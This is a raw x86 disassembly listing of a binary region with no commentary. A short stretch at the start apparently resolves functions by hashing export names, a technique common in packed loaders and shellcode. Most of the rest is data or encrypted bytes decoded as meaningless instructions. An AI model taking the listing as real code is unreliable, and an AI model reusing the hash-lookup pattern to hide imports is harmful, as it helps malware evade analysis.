  41a8a4:	bound  ebx,QWORD PTR [ebp-0x4579087e]
  41a8aa:	cmp    ebx,esi
  41a8ac:	cld    
  41a8ad:	stos   DWORD PTR es:[edi],eax
  41a8ae:	pusha  
  41a8af:	retf   0xea35
  41a8b2:	add    eax,ebx
  41a8b4:	jmp    0x41c8fd
  41a8b9:	mov    eax,DWORD PTR [ebp-0x2c]
  41a8bc:	movzx  eax,WORD PTR [eax+edi*2]
  41a8c0:	mov    ecx,DWORD PTR [ebp-0x14]
  41a8c3:	mov    eax,DWORD PTR [ecx+eax*4]
  41a8c6:	mov    DWORD PTR [ebp+0xc],eax
  41a8c9:	mov    eax,DWORD PTR [ebp-0x4]
  41a8cc:	mov    ecx,DWORD PTR [ebp-0x8]
  41a8cf:	xor    eax,0x7510850
  41a8d4:	add    eax,ebx
  41a8d6:	cmp    ecx,eax
  41a8d8:	jne    0x41a8eb
  41a8de:	mov    eax,DWORD PTR [ebp-0x4]
  41a8e1:	xor    eax,0x7510850
  41a8e6:	jmp    0x41a8b2
  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	or     DWORD PTR [ebx+0x4c],0x36
  41a918:	jmp    0x7e10:0x787fd548
  41a91f:	js     0x41a999
  41a921:	add    eax,0xffba45cb
  41a926:	and    BYTE PTR [eax],bh
  41a928:	xchg   ebx,eax
  41a929:	xchg   edi,eax
  41a92a:	mov    edx,DWORD PTR [edi-0x52cd8dd9]
  41a930:	call   0xcfbf372
  41a935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a936:	ja     0x41a933
  41a938:	xchg   edx,eax
  41a939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a93a:	mov    eax,0x7ee1de6
  41a93f:	inc    esp
  41a940:	retf   0x45e6
  41a943:	mov    ebx,0x5ce010
  41a948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a949:	in     eax,dx
  41a94a:	add    BYTE PTR [edx-0x4167465b],ch
  41a950:	jg     0x41a94b
  41a952:	mov    cl,ah
  41a954:	xchg   esp,eax
  41a955:	lock in eax,dx
  41a957:	xchg   ecx,eax
  41a958:	aad    0xd9
  41a95a:	rcr    DWORD PTR [eax],0x8
  41a95d:	mov    bl,0xee
  41a95f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a960:	mov    edx,0xf30875bf
  41a965:	cmp    ebp,esp
  41a967:	mov    DWORD PTR [esi+0x72],ecx
  41a96a:	xor    al,cl
  41a96c:	(bad)  
  41a96d:	scas   al,BYTE PTR es:[edi]
  41a96e:	mov    bl,0xd4
  41a970:	test   BYTE PTR ds:0xd2d57ccd,dh
  41a976:	leave  
  41a977:	xor    eax,0xfb2e436b
  41a97c:	sbb    ebx,esp
  41a97e:	push   ebp
  41a97f:	jne    0x41a93f
  41a981:	push   esi
  41a982:	jns    0x41a948
  41a984:	sub    ah,BYTE PTR [ebx+0x758691ea]
  41a98a:	leave  
  41a98b:	outs   dx,BYTE PTR ds:[esi]
  41a98c:	jnp    0x41a9e6
  41a98e:	sub    eax,0x8d1cbbf9
  41a993:	mov    dl,0x3e
  41a995:	pop    esp
  41a996:	push   esi
  41a997:	inc    eax
  41a999:	mov    edx,0x65d507eb
  41a99e:	and    esp,DWORD PTR [ecx+0x62ef1bcb]
  41a9a4:	mov    ds:0x93197e3d,eax
  41a9a9:	jp     0x41a9d0
  41a9ab:	popf   
  41a9ac:	sbb    DWORD PTR [ebx],0x29926b75
  41a9b2:	xchg   DWORD PTR [esi],ebx
  41a9b4:	clc    
  41a9b5:	out    dx,eax
  41a9b6:	push   eax
  41a9b7:	cmp    bl,al
  41a9b9:	mov    edx,0x25d8dd81
  41a9be:	daa    
  41a9bf:	adc    BYTE PTR [eax],bh
  41a9c1:	shl    DWORD PTR [esi],1
  41a9c3:	popa   
  41a9c4:	mov    ds:0xdfc3d18b,eax
  41a9c9:	mov    al,ds:0x501db670
  41a9ce:	xor    dh,0xbf
  41a9d1:	lds    esi,FWORD PTR [eax+0x5d7a206e]
  41a9d7:	inc    edx
  41a9d8:	lsl    edx,WORD PTR [edx-0x362bee72]
  41a9df:	popa   
  41a9e0:	xchg   edi,eax
  41a9e1:	inc    ebx
  41a9e2:	outs   dx,DWORD PTR ds:[esi]
  41a9e3:	test   eax,0xd7bb2d9e
  41a9e9:	(bad)  
  41a9ea:	pop    ebx
  41a9eb:	(bad)  
  41a9ec:	sbb    DWORD PTR [ebx],ebp
  41a9ee:	xor    eax,0x29238fd1
  41a9f3:	stos   DWORD PTR es:[edi],eax
  41a9f4:	adc    eax,esp
  41a9f6:	or     esi,DWORD PTR [ecx]
  41a9f8:	in     eax,0xd
  41a9fa:	loop   0x41a9af
  41a9fc:	(bad)  
  41a9fd:	xchg   edi,eax
  41a9fe:	mov    esp,0x2bc0fb09
  41aa03:	fnstcw WORD PTR [ebx-0x30]
  41aa06:	sub    eax,edi
  41aa08:	jae    0x41aa6e
  41aa0a:	in     eax,dx
  41aa0b:	cmp    eax,0x28c0056a
  41aa10:	pop    ebx
  41aa11:	jmp    0x41aa11
  41aa13:	pop    eax
  41aa14:	(bad)  
  41aa15:	inc    BYTE PTR [ebx-0x37]
  41aa18:	xchg   BYTE PTR [esi],bl
  41aa1a:	xchg   edx,eax
  41aa1b:	in     eax,dx
  41aa1c:	scas   eax,DWORD PTR es:[edi]
  41aa1d:	dec    eax
  41aa1e:	adc    ch,BYTE PTR [esi-0x5f]
  41aa21:	daa    
  41aa22:	pop    es
  41aa23:	add    DWORD PTR [ecx+ecx*8-0x9bf486],0xc13b043f
  41aa2e:	sub    BYTE PTR [ebp-0x629b26b8],bl
  41aa34:	out    0xa1,eax
  41aa36:	std    
  41aa37:	inc    ebx
  41aa38:	mov    WORD PTR ds:0xdfaf67c9,ds
  41aa3e:	xchg   edi,eax
  41aa3f:	xchg   ebx,esp
  41aa41:	mov    bh,0x20
  41aa43:	fsub   QWORD PTR [edi]
  41aa45:	jno    0x41aab4
  41aa47:	jae    0x41aa7b
  41aa49:	jb     0x41aa8b
  41aa4b:	jnp    0x41aa92
  41aa4d:	mov    esp,esp
  41aa4f:	mov    edx,0x7b894172
  41aa54:	add    BYTE PTR [edx+edi*2-0x14c6f523],bl
  41aa5b:	push   edx
  41aa5c:	mov    ds:0xda27ce9b,al
  41aa61:	aad    0x66
  41aa63:	arpl   WORD PTR [edi+esi*1-0x5519419e],di
  41aa6a:	js     0x41aade
  41aa6c:	jnp    0x41aa62
  41aa6e:	dec    ebx
  41aa6f:	enter  0x581c,0x9c
  41aa73:	ror    BYTE PTR [ecx+ecx*1+0x365c1441],0xe4
  41aa7b:	les    edi,FWORD PTR [esi-0x68eedd0b]
  41aa81:	xlat   BYTE PTR ds:[ebx]
  41aa82:	jecxz  0x41aa35
  41aa84:	mov    esi,0xf758f444
  41aa89:	hlt    
  41aa8a:	ins    DWORD PTR es:[edi],dx
  41aa8b:	cmp    esp,DWORD PTR [edx+0x1c]
  41aa8e:	hlt    
  41aa8f:	aas    
  41aa90:	xchg   ebx,eax
  41aa91:	add    al,0xf9
  41aa93:	mov    ebp,0x4c114bd4
  41aa98:	jg     0x41aafa
  41aa9a:	inc    edi
  41aa9b:	xor    al,0xad
  41aa9d:	aad    0xad
  41aa9f:	(bad)  
  41aaa0:	sub    ah,BYTE PTR [esi+0x36]
  41aaa3:	xchg   esi,eax
  41aaa4:	mov    ebp,0x95d68542
  41aaa9:	sbb    BYTE PTR [eax],ch
  41aaab:	outs   dx,BYTE PTR ds:[esi]
  41aaac:	xor    BYTE PTR [ebx+ebp*2],0xac
  41aab0:	mov    dl,0xc3
  41aab2:	es xchg ebp,eax
  41aab4:	cwde   
  41aab5:	pop    esi
  41aab6:	pop    edi
  41aab7:	out    dx,eax
  41aab8:	jb     0x41ab1f
  41aaba:	cmp    dl,BYTE PTR [edx-0x9bab0b6]
  41aac0:	jmp    0x12994b9c
  41aac5:	push   esp
  41aac6:	adc    esi,esp
  41aac8:	add    BYTE PTR [esi+ebp*4+0x7ca2b62d],dl
  41aacf:	imul   edi,DWORD PTR [esi-0x6202e5bf],0xb6840630
  41aad9:	js     0x41aa83
  41aadb:	dec    ecx
  41aadc:	lea    ebx,[edx+0x74]
  41aadf:	fsubp  st(7),st
  41aae1:	mov    dl,0x68
  41aae3:	dec    ecx
  41aae4:	jae    0x41ab17
  41aae6:	rcr    BYTE PTR ds:0xcc05fb3c,1
  41aaec:	xchg   BYTE PTR [edx+0x575bdaba],ch
  41aaf2:	sub    dh,BYTE PTR [esp+ebx*2-0x28]
  41aaf6:	and    ch,cl
  41aaf8:	repz hlt 
  41aafa:	stc    
  41aafb:	xchg   ebp,edi
  41aafd:	lds    eax,FWORD PTR [edi+0x11]
  41ab00:	sbb    esi,DWORD PTR [edi+0x75b647ba]
  41ab06:	ins    DWORD PTR es:[edi],dx
  41ab07:	lods   eax,DWORD PTR ds:[esi]
  41ab08:	stos   BYTE PTR es:[edi],al
  41ab09:	inc    ebp
  41ab0a:	push   edi
  41ab0b:	mov    esp,0x8e5e56c
  41ab10:	jecxz  0x41aabb
  41ab12:	mov    dh,0x13
  41ab14:	mov    esi,0xd1fc825d
  41ab19:	mov    eax,0x4c4aec4b
  41ab1e:	test   DWORD PTR [ebx+0x246a6a33],0x837c9f10
  41ab28:	scas   al,BYTE PTR es:[edi]
  41ab29:	das    
  41ab2a:	dec    ebp
  41ab2b:	data16 rcl BYTE PTR [eax],1
  41ab2e:	cmp    edi,DWORD PTR [eax+0x6840499d]
  41ab34:	je     0x41ab10
  41ab36:	nop
  41ab37:	push   0xffffffb1
  41ab39:	pop    ecx
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x400dfcbe
  41ab52:	xchg   esp,eax
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab33
  41ab5c:	arpl   WORD PTR [eax-0x5d],ax
  41ab5f:	jmp    0x41ab76
  41ab61:	fstp   TBYTE PTR [ebx]
  41ab63:	je     0x41ab4b
  41ab65:	arpl   WORD PTR [ecx+0x4746f070],bp
  41ab6b:	aaa    
  41ab6c:	inc    esp
  41ab6d:	je     0x41abdd
  41ab6f:	and    al,0x35
  41ab72:	test   al,0xf4
  41ab74:	mov    WORD PTR [ebx-0x1ecaa0cd],fs
  41ab7a:	idiv   DWORD PTR ds:0xa53625d5
  41ab80:	mov    al,ch
  41ab82:	retf   0xea0b
  41ab85:	push   ss
  41ab86:	jns    0x41abf3
  41ab88:	push   0x31a5d92b
  41ab8d:	add    bh,BYTE PTR [ebx-0x5]
  41ab90:	mov    BYTE PTR [esi+0x8],dh
  41ab93:	and    edx,edx
  41ab95:	pop    DWORD PTR [ecx]
  41ab97:	inc    ebp
  41ab98:	adc    BYTE PTR [esi-0x7d],bl
  41ab9b:	les    eax,FWORD PTR [esi+0x3f]
  41ab9e:	ins    DWORD PTR es:[edi],dx
  41ab9f:	loopne 0x41ab30
  41aba1:	pushf  
  41aba2:	clc    
  41aba3:	leave  
  41aba4:	dec    edi
  41aba5:	loop   0x41aba7
  41aba7:	imul   esi,DWORD PTR [ebp-0xde8ee32],0x2a
  41abae:	fmul   QWORD PTR [edx-0x25]
  41abb1:	jge    0x41ac07
  41abb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abb4:	fmul   st,st(1)
  41abb6:	jg     0x41ab4e
  41abb8:	fst    QWORD PTR [eax+0x4a810251]
  41abbe:	jo     0x41abdc
  41abc0:	xor    DWORD PTR [edx+eax*2+0x7b],edx
  41abc4:	aad    0x6f
  41abc6:	cli    
  41abc7:	sub    ebx,0xad10bd18
  41abcd:	adc    esp,edx
  41abcf:	mov    bh,0xbc
  41abd1:	dec    ecx
  41abd2:	imul   esi,esp,0x4d0220d5
  41abd8:	mov    bh,0x9f
  41abda:	das    
  41abdb:	das    
  41abdc:	repnz jecxz 0x41ab7b
  41abdf:	and    al,0xbd
  41abe1:	cmp    BYTE PTR [ebx+ebx*8-0x742525b2],bh
  41abe8:	sbb    al,0x37
  41abea:	(bad)  
  41abeb:	cmp    dl,BYTE PTR [eax-0x6451e837]
  41abf1:	and    eax,0xdbf62460
  41abf6:	cmp    eax,0xa496689a
  41abfb:	pop    ds
  41abfc:	xchg   ecx,eax
  41abfd:	or     bh,BYTE PTR [eax+edx*8]
  41ac00:	add    DWORD PTR [eax-0x124125f5],esp
  41ac06:	or     cl,BYTE PTR [edi-0x6b]
  41ac09:	sub    eax,0xfe010966
  41ac0e:	inc    ecx
  41ac0f:	pop    ss
  41ac10:	mov    al,0x7f
  41ac12:	in     eax,dx
  41ac13:	retf   0x287c
  41ac16:	das    
  41ac17:	sbb    DWORD PTR [edx],eax
  41ac19:	rol    DWORD PTR [esi],1
  41ac1b:	jne    0x41abda
  41ac1d:	(bad)  
  41ac1e:	je     0x41ac3f
  41ac20:	and    al,0xe8
  41ac22:	mov    ds:0x826ab173,eax
  41ac27:	cli    
  41ac28:	call   0xc537:0x8ac82528
  41ac2f:	jmp    0x22dc:0x611bd175
  41ac36:	pop    es
  41ac37:	cli    
  41ac38:	add    ch,BYTE PTR [eax+0x15]
  41ac3b:	test   eax,0x905b7fda
  41ac40:	push   edi
  41ac41:	push   cs
  41ac42:	add    dl,ch
  41ac44:	add    bl,BYTE PTR [eax-0x2d]
  41ac47:	and    esi,DWORD PTR [esi-0x61]
  41ac4a:	sahf   
  41ac4b:	push   ss
  41ac4c:	out    0x82,al
  41ac4e:	xor    edx,0xac1a6ae1
  41ac54:	xlat   BYTE PTR ds:[ebx]
  41ac55:	test   esp,0xb35ba935
  41ac5b:	aam    0xb5
  41ac5d:	push   cs
  41ac5e:	inc    edi
  41ac5f:	rol    DWORD PTR [ecx+0x4603b1ac],cl
  41ac65:	and    DWORD PTR [ecx+0x5dee8294],edx
  41ac6b:	jmp    0xf8f43c6d
  41ac70:	inc    ecx
  41ac71:	jno    0x41abf9
  41ac73:	loopne 0x41ac43
  41ac75:	(bad)  
  41ac76:	pushf  
  41ac77:	add    eax,0x30959855
  41ac7c:	cmp    al,0x1
  41ac7e:	(bad)  
  41ac7f:	xor    eax,DWORD PTR [ebx-0x3c]
  41ac82:	xchg   edx,eax
  41ac83:	mov    eax,ds:0xb1d0baf2
  41ac88:	fisttp QWORD PTR [ebx+eiz*4]
  41ac8b:	in     eax,0xd
  41ac8d:	mov    ebp,0x7fe5603b
  41ac92:	pop    ds
  41ac93:	scas   al,BYTE PTR es:[edi]
  41ac94:	(bad)  ds:0xb778c3ca
  41ac9a:	adc    ebp,esp
  41ac9c:	mov    ch,bl
  41ac9e:	into   
  41ac9f:	xchg   edi,eax
  41aca0:	mov    WORD PTR [edx+0x5a],?
  41aca3:	push   ecx
  41aca4:	dec    ecx
  41aca5:	loope  0x41ac84
  41aca7:	lods   al,BYTE PTR ds:[esi]
  41aca8:	mov    ds:0x800bca91,al
  41acad:	add    bl,0x52
  41acb0:	push   0x3f
  41acb2:	dec    edi
  41acb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acb4:	inc    ebp
  41acb5:	test   BYTE PTR [edx+0x48],dl
  41acb8:	or     esp,DWORD PTR [ebx-0x363b23a5]
  41acbe:	out    0x7f,eax
  41acc0:	pop    ebp
  41acc1:	or     BYTE PTR [ebx-0x2da0efad],cl
  41acc7:	sbb    eax,0x5ed4334c
  41accc:	stc    
  41accd:	fsubr  st(6),st
  41accf:	sub    esi,0x479979aa
  41acd5:	or     bl,bl
  41acd7:	or     al,0xb5
  41acd9:	mov    BYTE PTR [edx-0x74],bl
  41acdc:	dec    edx
  41acdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acde:	and    al,0x34
  41ace0:	mov    al,0xa1
  41ace2:	inc    ebx
  41ace3:	mov    ebp,DWORD PTR [edi-0x1a0d7bcf]
  41ace9:	push   esi
  41acea:	js     0x41acc4
  41acec:	fdiv   DWORD PTR [ecx]
  41acee:	int3   
  41acef:	lds    ecx,FWORD PTR [edx+0x17]
  41acf2:	sub    DWORD PTR [edi],edi
  41acf4:	push   edx
  41acf5:	lods   al,BYTE PTR ds:[esi]
  41acf6:	imul   esp,DWORD PTR [edi-0x55af1d7a],0x7f
  41acfd:	add    al,0xaf
  41acff:	mov    ds:0xaff48f6a,eax
  41ad04:	dec    eax
  41ad05:	loop   0x41acd0
  41ad07:	daa    
  41ad08:	repz adc eax,0xf2a523d7
  41ad0e:	pop    ebx
  41ad0f:	loop   0x41ad78
  41ad11:	and    BYTE PTR [edi+0x58e879d9],0xa2
  41ad18:	not    DWORD PTR [ecx]
  41ad1a:	or     eax,0x213a3e1b
  41ad1f:	cdq    
  41ad20:	div    esi
  41ad22:	mov    WORD PTR [esi+0x40],cs
  41ad25:	mov    ch,0x84
  41ad27:	sbb    BYTE PTR [esi-0x3521ff35],cl
  41ad2d:	xor    ah,BYTE PTR ds:0x10816599
  41ad33:	(bad)  
  41ad34:	xchg   BYTE PTR ds:[ebx],dl
  41ad37:	setl   ch
  41ad3a:	mov    eax,0x118a4190
  41ad3f:	and    al,0x9e
  41ad41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad42:	adc    DWORD PTR [eax-0x7d037c66],0x64
  41ad49:	shl    ecx,1
  41ad4b:	popf   
  41ad4c:	inc    esi
  41ad4d:	xchg   ebx,eax
  41ad4e:	jp     0x41ad85
  41ad50:	shr    DWORD PTR [edx],0x62
  41ad53:	mov    BYTE PTR [eax],0x38
  41ad56:	fist   DWORD PTR [esi]
  41ad58:	add    BYTE PTR [ebp+0x43a5d21a],dh
  41ad5e:	popa   
  41ad5f:	imul   edi,esp,0x43
  41ad62:	fcomp  DWORD PTR [ebx+0x2551ead2]
  41ad68:	xor    bl,0x2d
  41ad6b:	loop   0x41ad96
  41ad6d:	or     al,dh
  41ad6f:	xchg   ecx,eax
  41ad70:	sub    al,0x9c
  41ad72:	daa    
  41ad73:	xchg   ebx,ecx
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x1bd25295,eax
  41ad89:	addr16 mov al,0xa2
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adaf
  41ad95:	push   0xd7c4f3fb
  41ad9a:	xchg   edi,eax
  41ad9b:	mov    ds:0xae0921ea,eax
  41ada0:	retf   
  41ada1:	jmp    0x41ad70
  41ada3:	mov    cl,0x35
  41ada5:	aam    0x34
  41ada7:	aad    0x4f
  41ada9:	mov    ds:0x88c65f69,al
  41adae:	mov    esi,0x7afe733d
  41adb3:	jg     0x41ada0
  41adb5:	xor    BYTE PTR [ecx+ecx*2-0x7790f928],0xac
  41adbd:	iret   
  41adbe:	and    al,0x1b
  41adc0:	rep stos BYTE PTR es:[edi],al
  41adc2:	cdq    
  41adc3:	inc    esi
  41adc4:	ror    DWORD PTR [ebx-0xed1e36b],1
  41adca:	mov    edi,0x6b43956a
  41adcf:	(bad)  
  41add0:	aam    0x97
  41add2:	(bad)  
  41add3:	enter  0xb1b1,0x60
  41add7:	inc    eax
  41add8:	in     al,0x44
  41adda:	sti    
  41addb:	imul   esp,DWORD PTR [ecx+0x22],0xa98fbaf
  41ade2:	(bad)  
  41ade3:	outs   dx,BYTE PTR ds:[esi]
  41ade4:	sbb    BYTE PTR [esi+0x19],dl
  41ade7:	loop   0x41adc7
  41ade9:	xchg   ebx,eax
  41adea:	pop    es
  41adeb:	dec    esp
  41adec:	dec    edx
  41aded:	shl    esi,cl
  41adef:	xchg   esi,eax
  41adf0:	cmp    eax,0xcb099925
  41adf5:	jle    0x41adef
  41adf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf8:	xor    DWORD PTR [eax-0x35],ebp
  41adfb:	dec    al
  41adfd:	mov    esp,0x4155491a
  41ae02:	js     0x41adb3
  41ae04:	mov    edx,0xb535d94f
  41ae09:	sub    DWORD PTR [eax],eax
  41ae0b:	out    dx,al
  41ae0c:	(bad)  
  41ae0d:	pop    eax
  41ae0e:	mov    esp,0xccf36d9a
  41ae13:	aaa    
  41ae14:	jbe    0x41adef
  41ae16:	sahf   
  41ae17:	jl     0x41adee
  41ae19:	cli    
  41ae1a:	xor    dh,BYTE PTR [eax+ebp*4-0x7a]
  41ae1e:	mov    dl,0xa7
  41ae20:	adc    BYTE PTR [edi],bl
  41ae22:	xor    dl,BYTE PTR [ecx]
  41ae24:	dec    ecx
  41ae25:	jmp    0x41adb5
  41ae27:	int    0x36
  41ae29:	aas    
  41ae2a:	rcr    eax,cl
  41ae2c:	loope  0x41adb2
  41ae2e:	out    0x68,eax
  41ae30:	inc    eax
  41ae31:	xor    al,0x22
  41ae33:	add    al,0xd2
  41ae35:	pop    ds
  41ae36:	sbb    al,0x31
  41ae38:	test   DWORD PTR [edx+eiz*4+0x4202d797],eax
  41ae3f:	mov    ds:0x9bd45348,eax
  41ae44:	mov    DWORD PTR [ecx-0x21],ecx
  41ae47:	jno    0x41ae7b
  41ae49:	addr16 shl ebx,1
  41ae4c:	jbe    0x41aea9
  41ae4e:	xchg   ecx,eax
  41ae4f:	jns    0x41ae4f
  41ae51:	hlt    
  41ae52:	retf   0xf29f
  41ae55:	sahf   
  41ae56:	mov    DWORD PTR [ebx+0x1a],0x345e4439
  41ae5d:	sub    al,0xc4
  41ae5f:	pop    esi
  41ae60:	test   BYTE PTR [ecx+0x23],ah
  41ae63:	test   esp,ebx
  41ae65:	add    al,ah
  41ae67:	mov    eax,ds:0x6372c411
  41ae6c:	lock imul ecx,DWORD PTR [eax-0x609c634d],0x6527cc68
  41ae77:	(bad)  
  41ae78:	sbb    ecx,DWORD PTR [eax]
  41ae7a:	and    eax,0xc1b7ad86
  41ae7f:	mov    DWORD PTR [eax-0x62],0x25b99cd2
  41ae86:	xchg   edi,eax
  41ae87:	and    BYTE PTR [edi-0x10],0x93
  41ae8b:	jns    0x41ae3e
  41ae8d:	pop    ss
  41ae8e:	addr16 std 
  41ae90:	adc    DWORD PTR [eax],ebp
  41ae92:	push   edx
  41ae93:	jle    0x41ae30
  41ae95:	jge    0x41ae2b
  41ae97:	ins    BYTE PTR es:[edi],dx
  41ae98:	jno    0x41ae80
  41ae9a:	push   0x4c
  41ae9c:	fnstcw WORD PTR [ebx+0x6cdd4a40]
  41aea2:	jno    0x41aedd
  41aea4:	adc    DWORD PTR [ecx-0x4bfb26ba],eax
  41aeaa:	aad    0x8c
  41aeac:	leave  
  41aead:	sbb    edx,esi
  41aeaf:	sbb    ch,BYTE PTR [ebx+0x2053548e]
  41aeb5:	xchg   ebp,eax
  41aeb6:	push   esi
  41aeb7:	sbb    ch,BYTE PTR [edx]
  41aeb9:	push   ecx
  41aeba:	sbb    eax,DWORD PTR [eax-0x5461730b]
  41aec0:	sti    
  41aec1:	dec    ebx
  41aec2:	mov    BYTE PTR [eax-0x40],bl
  41aec5:	jmp    0x3ca7d1f5
  41aeca:	jmp    0x41ae67
  41aecc:	cmp    al,0x21
  41aece:	popf   
  41aecf:	dec    edi
  41aed0:	xor    esp,ebx
  41aed2:	fsub   QWORD PTR [ecx]
  41aed4:	inc    edx
  41aed5:	and    ch,al
  41aed7:	push   es
  41aed8:	gs cli 
  41aeda:	dec    edx
  41aedb:	test   eax,0xcdf2c564
  41aee0:	mov    ds:0xada23866,eax
  41aee5:	lock cs mov ecx,0x4866d352
  41aeec:	pop    edx
  41aeed:	jb     0x41af0a
  41aeef:	dec    eax
  41aef0:	mov    bh,BYTE PTR [ecx+0x4f482359]
  41aef6:	cmp    eax,0x8ceff842
  41aefb:	and    DWORD PTR [ebp-0xc39a09d],esi
  41af01:	xor    eax,0x860b9120
  41af06:	xchg   edi,eax
  41af07:	imul   BYTE PTR [esi+0xa0ca4e2]
  41af0d:	js     0x41aed5
  41af0f:	dec    edi
  41af10:	ficom  WORD PTR [edx+0x4172255f]
  41af16:	sub    dl,0x5d
  41af19:	mov    ecx,0x56eb37c3
  41af1e:	in     eax,dx
  41af1f:	ja     0x41af31
  41af21:	call   0x4adc:0xc4892382
  41af28:	push   edi
  41af29:	jnp    0x41aefe
  41af2b:	jmp    ebx
  41af2d:	loopne 0x41af98
  41af2f:	(bad)  
  41af31:	clc    
  41af32:	fidivr WORD PTR [esi]
  41af34:	cmp    al,0x37
  41af36:	mov    al,BYTE PTR [edx+0x6dd4f72f]
  41af3c:	push   ds
  41af3d:	jmp    DWORD PTR [esi]
  41af3f:	retf   
  41af40:	or     BYTE PTR [edi+0x7a],dl
  41af43:	fs inc ax
  41af46:	jnp    0x41af10
  41af48:	mov    ds:0xd521b186,al
  41af4d:	outs   dx,DWORD PTR ds:[esi]
  41af4e:	xor    ecx,DWORD PTR [esi-0xf]
  41af51:	push   ecx
  41af52:	out    dx,al
  41af53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af54:	clc    
  41af55:	sub    BYTE PTR [ebx+0x117ae17c],bh
  41af5b:	mov    DWORD PTR [ebx-0x40f6d9bf],edi
  41af61:	jno    0x41af1e
  41af63:	enter  0xeaea,0x66
  41af67:	imul   ebx,DWORD PTR [esi],0xaee169a9
  41af6d:	push   es
  41af6e:	stc    
  41af6f:	inc    ebp
  41af70:	test   eax,0x7f8a01ad
  41af75:	sub    eax,ebp
  41af77:	sti    
  41af78:	in     eax,dx
  41af79:	imul   eax,esi,0x477d06b7
  41af7f:	mov    bl,BYTE PTR [esi+0x767c4b5e]
  41af85:	jecxz  0x41af59
  41af87:	nop
  41af88:	mov    es,WORD PTR [edx]
  41af8a:	cdq    
  41af8b:	fwait
  41af8c:	rcr    DWORD PTR [edx],cl
  41af8e:	sub    dl,0x6f
  41af91:	inc    esi
  41af92:	mov    esp,0x22d280fd
  41af97:	repz mov eax,0xbc4dee79
  41af9d:	dec    eax
  41af9e:	jae    0x845a779b
  41afa4:	adc    BYTE PTR [edx],0xf4
  41afa7:	pushf  
  41afa8:	out    dx,eax
  41afa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afaa:	sbb    ebp,DWORD PTR [ecx+0x30e9cb87]
  41afb0:	add    al,BYTE PTR [eax]
  41afb2:	add    ch,al
  41afb4:	sar    DWORD PTR [ecx*8-0x2626322c],1
  41afbb:	mov    edi,0xa1181003
  41afc0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41afc2:	fcom   DWORD PTR [eax]
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af7c
  41afcc:	retf   0xfa76
  41afcf:	push   esi
  41afd0:	clc    
  41afd1:	icebp  
  41afd2:	jl     0x41afc6
  41afd4:	fld    DWORD PTR [ebx]
  41afd6:	dec    edi
  41afd7:	mov    bl,0x35
  41afd9:	scas   eax,DWORD PTR es:[edi]
  41afda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afdb:	jno    0x41af67
  41afdd:	test   al,0x3a
  41afdf:	fcomp  DWORD PTR [ebx+0x63013aa8]
  41afe5:	xchg   esi,eax
  41afe6:	ja     0x41b02c
  41afe8:	cmp    cl,0xb5
  41afeb:	call   0x92d9115e
  41aff0:	fucomp st(2)
  41aff2:	nop
  41aff3:	jmp    0x41b072
  41aff5:	mov    ah,0x76
  41aff7:	mov    DWORD PTR [ebx+0x4767eab1],eax
  41affd:	jnp    0x41b039
  41afff:	sub    dh,0x6d
  41b002:	adc    al,0x56
  41b004:	sub    BYTE PTR [edx-0x3e618192],bh
  41b00a:	mov    DWORD PTR [esp+ebp*1-0x4d],esi
  41b00e:	or     DWORD PTR [ebx-0x1be5d149],ecx
  41b014:	mov    ebx,0xac12355f
  41b019:	or     eax,0x91364bec
  41b01e:	mov    eax,0xe532b454
  41b023:	jecxz  0x41b027
  41b025:	mov    ds:0x8434c8ad,al
  41b02a:	pop    ds
  41b02b:	mov    ch,BYTE PTR [esi]
  41b02d:	call   0x8c5a:0x98132c9f
  41b034:	sub    al,0x80
  41b036:	xchg   esi,eax
  41b037:	fwait
  41b038:	cs mov dl,0x15
  41b03b:	xor    DWORD PTR [ebp-0x169dc65a],ebp
  41b041:	sub    al,0x11
  41b043:	mov    fs,ebp
  41b045:	push   cs
  41b046:	shr    BYTE PTR [edi+0x2f],cl
  41b049:	scas   eax,DWORD PTR es:[edi]
  41b04a:	inc    edi
  41b04b:	enter  0x46a9,0x5e
  41b04f:	jbe    0x41b0ab
  41b051:	add    dl,BYTE PTR [esi+0x2c1e76a3]
  41b057:	test   edi,esp
  41b059:	xlat   BYTE PTR ds:[ebx]
  41b05a:	mov    cl,0xcf
